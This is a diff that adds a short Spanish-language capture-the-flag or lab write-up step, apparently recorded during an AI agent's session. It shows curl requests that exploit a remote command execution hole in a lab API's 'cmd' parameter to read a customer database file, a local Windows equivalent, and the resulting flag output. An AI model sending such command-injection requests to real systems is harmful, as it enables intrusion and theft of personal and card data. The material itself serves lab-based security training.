@@ -1,0 +1,7 @@
+# R4-03 — Crown jewels: con el RCE se lee el almacén de clientes y aparece la flag de impacto.
+# PoC canónico contra el target Docker (Linux):
+$ curl 'http://phantomcorp/api/reporte?token=phantom-api-7c1e&cmd=cat%20/app/priv/clientes.db.txt'
+# Equivalente ejecutado contra la instancia fiel local (Windows, mismo server.py):
+$ curl 'http://127.0.0.1:8080/api/reporte?token=phantom-api-7c1e&cmd=type%20...\priv\clientes.db.txt'
+$ type C:\Users\Gerit\AppData\Local\Temp\claude\d3b626c86962a2d4\fdb4dea4-d22f-4590-a641-c3784a4985ce\scratchpad\labfinal_target\priv\clientes.db.txt
+clientes: 48210 registros (nombre, DNI, tarjeta). FLAG{final_crown_jewels}
